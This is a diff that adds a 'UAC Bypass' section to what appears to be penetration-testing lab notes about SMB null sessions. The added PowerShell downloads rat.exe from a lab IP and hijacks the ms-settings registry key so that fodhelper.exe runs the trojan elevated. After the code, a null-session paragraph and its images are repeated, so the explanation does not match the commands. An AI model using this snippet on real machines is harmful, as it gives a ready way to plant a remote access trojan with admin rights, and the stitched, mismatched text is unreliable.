@@ -464,3 +464,50 @@ You can also perform the very same checks by using smbclient:
 <br/>
 <img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
 </details>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <details> 
+  <summary> <b>UAC Bypass</b> </summary>
+    
+    
+ https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
+
+```ps
+https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
+iwr -Uri http://10.10.10.11/rat.exe -Outfile C:\rat.exe
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\rat.exe" -Force
+
+execute the binary
+C:\Windows\System32\fodhelper.exe
+```
+    
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
+<br/>
+
+
+The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
+  
+Example:
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
+<br/>
+You can also perform the very same checks by using smbclient:
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
+</details>
